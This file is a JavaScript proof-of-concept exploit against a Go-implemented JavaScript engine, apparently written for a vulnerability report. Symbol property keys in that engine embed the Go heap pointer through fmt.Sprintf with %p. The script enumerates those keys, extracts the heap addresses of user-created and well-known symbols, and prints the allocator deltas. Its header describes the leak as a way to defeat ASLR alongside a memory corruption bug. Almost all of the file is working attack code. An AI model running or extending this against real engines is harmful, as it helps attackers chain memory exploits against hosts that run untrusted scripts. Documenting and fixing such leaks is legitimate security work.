// Exploit: Go Heap Address Leak via Symbol.Key()
//
// Symbol property keys use fmt.Sprintf("@@sym(%s)@%p", desc, ptr)
// which embeds the Go heap address of the Symbol struct into the
// property key string. By setting a symbol-keyed property on an
// object and then enumerating all property keys, we can extract
// the raw pointer address.
//
// Impact: Leaks Go runtime heap addresses, defeating ASLR if
// combined with a memory corruption primitive.

// Step 1: Create symbols and use them as property keys
var sym1 = Symbol("leak1");
var sym2 = Symbol("leak2");
var sym3 = Symbol("leak3");

var obj = {};
obj[sym1] = "a";
obj[sym2] = "b";
obj[sym3] = "c";

// Step 2: Get all own property names -- symbol keys are stored
// internally as "@@sym(leak1)@0x<hex_addr>" strings
var keys = Object.getOwnPropertyNames(obj);
var leaked = [];

var i = 0;
while (i < keys.length) {
    var k = keys[i];
    if (k.indexOf("@@sym(") === 0) {
        // Extract address after last @
        var parts = k.split("@");
        // Format: @@sym(desc)@0xADDR -- parts = ["", "", "sym(desc)", "0xADDR"]
        var addr = parts[parts.length - 1];
        leaked.push({desc: k, addr: addr});
        _print("[*] Symbol key: " + k);
        _print("[*] Leaked heap addr: " + addr);
    }
    i++;
}

// Step 3: Leak well-known symbol addresses (these are global singletons)
_print("");
_print("[*] Well-known symbol singleton addresses:");

var wk = {};
wk[Symbol.iterator] = 1;
wk[Symbol.toPrimitive] = 2;
wk[Symbol.hasInstance] = 3;
wk[Symbol.toStringTag] = 4;
wk[Symbol.match] = 5;
wk[Symbol.split] = 6;
wk[Symbol.search] = 7;
wk[Symbol.replace] = 8;
wk[Symbol.species] = 9;

var wkKeys = Object.getOwnPropertyNames(wk);
var wkAddrs = [];
var j = 0;
while (j < wkKeys.length) {
    var wkk = wkKeys[j];
    if (wkk.indexOf("@@sym(") === 0) {
        var wkParts = wkk.split("@");
        var wkAddr = wkParts[wkParts.length - 1];
        // Extract description
        var descStart = wkk.indexOf("(") + 1;
        var descEnd = wkk.indexOf(")@");
        var desc = wkk.substring(descStart, descEnd);
        _print("  " + desc + " = " + wkAddr);
        wkAddrs.push(wkAddr);
    }
    j++;
}

// Step 4: Demonstrate heap layout analysis
_print("");
if (leaked.length > 0) {
    _print("[+] SUCCESS: Leaked " + (leaked.length + wkAddrs.length) + " Go heap addresses");
    _print("[*] User-created Symbol structs are heap-allocated per Symbol() call");
    _print("[*] Well-known symbols are global singletons (stable across calls)");
    _print("[*] Address format: Go runtime heap pointer to runtime.Symbol struct");

    // Show address deltas between user symbols to reveal allocator behavior
    if (leaked.length >= 2) {
        var a1 = parseInt(leaked[0].addr, 16);
        var a2 = parseInt(leaked[1].addr, 16);
        if (!isNaN(a1) && !isNaN(a2)) {
            var delta = a2 - a1;
            _print("");
            _print("[*] Heap analysis:");
            _print("    sym1 @ " + leaked[0].addr);
            _print("    sym2 @ " + leaked[1].addr);
            _print("    delta = " + delta + " bytes");
            _print("    (reveals Go allocator stride / size class)");
        }
    }
} else {
    _print("[-] No addresses leaked -- getOwnPropertyNames may filter symbol keys");
}
